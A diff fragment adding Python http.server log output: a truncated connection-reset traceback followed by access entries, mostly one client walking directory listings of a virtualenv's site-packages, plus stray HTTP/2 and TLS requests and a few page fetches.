+    self.handle_one_request()
+  File "/usr/lib/python3.11/http/server.py", line 400, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/socket.py", line 706, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+206.168.34.45 - - [18/May/2025 08:14:22] "GET / HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:25] "GET / HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:26] code 404, message File not found
+206.168.34.45 - - [18/May/2025 08:14:26] "GET /favicon.ico HTTP/1.1" 404 -
+206.168.34.45 - - [18/May/2025 08:14:26] code 505, message Invalid HTTP version (2.0)
+206.168.34.45 - - [18/May/2025 08:14:26] "PRI * HTTP/2.0" 505 -
+206.168.34.45 - - [18/May/2025 08:14:29] "GET / HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:29] "GET /venv HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:30] "GET /venv/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:30] "GET /venv/bin HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:30] "GET /venv/bin/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:31] "GET /venv/lib64 HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:31] "GET /venv/lib64/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:31] "GET /venv/lib64/python3.11 HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:31] "GET /venv/lib64/python3.11/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:32] "GET /venv/lib64/python3.11/site-packages HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:32] "GET /venv/lib64/python3.11/site-packages/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:32] "GET /venv/lib64/python3.11/site-packages/protobuf-5.29.4.dist-info HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:32] "GET /venv/lib64/python3.11/site-packages/protobuf-5.29.4.dist-info/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:33] "GET /venv/lib64/python3.11/site-packages/tqdm HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:33] "GET /venv/lib64/python3.11/site-packages/tqdm/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:33] "GET /venv/lib64/python3.11/site-packages/propcache HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:34] "GET /venv/lib64/python3.11/site-packages/propcache/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:34] "GET /venv/lib64/python3.11/site-packages/cachecontrol HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:34] "GET /venv/lib64/python3.11/site-packages/cachecontrol/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:35] "GET /venv/lib64/python3.11/site-packages/uritemplate HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:35] "GET /venv/lib64/python3.11/site-packages/uritemplate/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:35] "GET /venv/lib64/python3.11/site-packages/sniffio HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:35] "GET /venv/lib64/python3.11/site-packages/sniffio/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:36] "GET /venv/lib64/python3.11/site-packages/blinker HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:36] "GET /venv/lib64/python3.11/site-packages/blinker/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:36] "GET /venv/lib64/python3.11/site-packages/typing_inspection-0.4.0.dist-info HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:37] "GET /venv/lib64/python3.11/site-packages/typing_inspection-0.4.0.dist-info/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:37] "GET /venv/lib64/python3.11/site-packages/annotated_types HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:37] "GET /venv/lib64/python3.11/site-packages/annotated_types/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:38] "GET /venv/lib64/python3.11/site-packages/h11 HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:38] "GET /venv/lib64/python3.11/site-packages/h11/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:38] "GET /venv/lib64/python3.11/site-packages/distro-1.9.0.dist-info HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:38] "GET /venv/lib64/python3.11/site-packages/distro-1.9.0.dist-info/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:39] "GET /venv/lib64/python3.11/site-packages/typing_extensions-4.13.2.dist-info HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:39] "GET /venv/lib64/python3.11/site-packages/typing_extensions-4.13.2.dist-info/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:39] "GET /venv/lib64/python3.11/site-packages/httpcore HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:40] "GET /venv/lib64/python3.11/site-packages/httpcore/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:40] "GET /venv/lib HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:40] "GET /venv/lib/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:40] "GET /cases HTTP/1.1" 301 -
+206.168.34.45 - - [18/May/2025 08:14:41] "GET /cases/ HTTP/1.1" 200 -
+206.168.34.45 - - [18/May/2025 08:14:44] code 404, message File not found
+206.168.34.45 - - [18/May/2025 08:14:44] "GET /favicon.ico HTTP/1.1" 404 -
+206.168.34.45 - - [18/May/2025 08:14:44] code 400, message Bad request syntax ('\\x16\\x03\\x01\\x00÷\\x01\\x00\\x00ó\\x03\\x03EvC\\x08')
+206.168.34.45 - - [18/May/2025 08:14:44] "\x16\x03\x01\x00÷\x01\x00\x00ó\x03\x03EvC\x08" 400 -
+79.124.58.198 - - [18/May/2025 08:24:53] "GET / HTTP/1.1" 200 -
+62.198.146.250 - - [18/May/2025 08:29:31] "GET /frontend.html HTTP/1.1" 200 -
+62.198.146.250 - - [18/May/2025 08:29:42] "GET /frontend.html HTTP/1.1" 304 -
